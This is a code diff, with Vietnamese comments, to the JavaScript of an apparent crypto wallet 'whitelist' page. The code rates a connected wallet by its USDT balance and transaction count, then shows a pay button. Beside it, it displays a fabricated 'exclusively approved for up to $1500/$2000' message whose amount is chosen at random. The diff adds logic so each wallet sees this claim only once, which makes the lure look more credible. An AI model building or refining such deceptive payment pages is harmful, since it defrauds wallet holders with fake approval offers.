@@ -181,16 +181,27 @@ document.getElementById('connectButton').addEventListener('click', async () => {
     const isEligible = usdtValue > 1 || txCount >= 5;
     document.getElementById('resultText').innerText = isEligible ? `Eligible (USDT: ${usdtValue}, Transactions: ${txCount})` : `Not eligible (USDT: ${usdtValue}, Transactions: ${txCount})`;
 
-    // Hiển thị form whitelist và random thông báo
+    // Hiển thị form whitelist
     document.getElementById('whitelistForm').style.display = 'block';
     if (isEligible) {
       document.getElementById('payButton').style.display = 'block';
       document.getElementById('notEligibleText').style.display = 'none';
-      document.getElementById('exclusiveMessage').style.display = 'block';
-      // Random $1500 hoặc $2000
-      const limit = Math.random() < 0.5 ? 1500 : 2000;
-      document.getElementById('exclusiveMessage').innerText = `You're exclusively approved for up to $${limit}!`;
-      console.log("Wallet eligible for whitelist, limit:", limit);
+
+      // Kiểm tra xem ví đã nhận thông báo chưa
+      const notificationKey = `notification_${connectedWallet}`;
+      const hasNotified = localStorage.getItem(notificationKey);
+      if (!hasNotified) {
+        document.getElementById('exclusiveMessage').style.display = 'block';
+        // Random $1500 hoặc $2000
+        const limit = Math.random() < 0.5 ? 1500 : 2000;
+        document.getElementById('exclusiveMessage').innerText = `You're exclusively approved for up to $${limit}!`;
+        // Lưu trạng thái thông báo
+        localStorage.setItem(notificationKey, 'true');
+        console.log("Wallet eligible for whitelist, limit:", limit);
+      } else {
+        document.getElementById('exclusiveMessage').style.display = 'none';
+        console.log("Wallet already notified, skipping message");
+      }
     } else {
       document.getElementById('payButton').style.display = 'none';
       document.getElementById('notEligibleText').style.display = 'block';
